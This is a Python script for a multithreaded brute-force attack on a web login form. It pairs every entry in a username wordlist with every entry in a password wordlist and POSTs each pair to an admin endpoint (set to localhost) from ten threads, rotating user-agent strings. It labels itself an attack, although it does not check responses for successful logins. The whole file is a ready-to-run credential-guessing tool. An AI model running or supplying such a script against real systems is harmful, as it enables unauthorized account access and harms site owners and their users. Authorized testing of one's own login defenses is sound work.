import requests
import threading
import time
import random
import sys
from queue import Queue

# --- CONFIGURATION ---
TARGET_URL = "http://localhost:5000/admin"
THREAD_COUNT = 10  # Increased threads for file processing
USER_FILE = "users.txt"
PASS_FILE = "passwords.txt"

# --- REALISTIC USER AGENTS ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:85.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)",
    "Hydra/9.1 (BruteForce)"
]

class FileBasedBot:
    def __init__(self):
        self.queue = Queue()
        self.lock = threading.Lock()

    def load_wordlists(self):
        """Reads from files and populates the Queue"""
        try:
            # 1. Load all users into memory
            with open(USER_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]

            # 2. Load all passwords into memory
            with open(PASS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"📂 Loaded {len(users)} users and {len(passwords)} passwords.")
            
            # 3. Create every combination (Cartesian Product)
            for u in users:
                for p in passwords:
                    self.queue.put((u, p))
                    
            print(f"📦 Total Tasks in Queue: {self.queue.qsize()}")
            
        except FileNotFoundError:
            print("❌ Error: Could not find users.txt or passwords.txt")
            sys.exit()

    def attack(self):
        """Worker thread function"""
        while not self.queue.empty():
            username, password = self.queue.get()
            user_agent = random.choice(USER_AGENTS)
            
            headers = {'User-Agent': user_agent}
            data = {'username': username, 'password': password}

            try:
                # Timeout is crucial so threads don't get stuck
                response = requests.post(TARGET_URL, data=data, headers=headers, timeout=3)
                
                with self.lock:
                    # Optional: Only print every 10th attempt to keep terminal clean
                    print(f"[{threading.current_thread().name}] Tried: {username}:{password}")

            except Exception as e:
                with self.lock:
                    print(f"❌ Connection Error: {e}")
            
            self.queue.task_done()

    def start(self):
        self.load_wordlists()
        
        print(f"🚀 Launching {THREAD_COUNT} threads...")
        
        thread_list = []
        for i in range(THREAD_COUNT):
            t = threading.Thread(target=self.attack, name=f"Bot-{i+1}")
            t.start()
            thread_list.append(t)

        self.queue.join()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join()
            
        print("\n✅ Attack Cycle Complete.")

if __name__ == "__main__":
    bot = FileBasedBot()
    bot.start()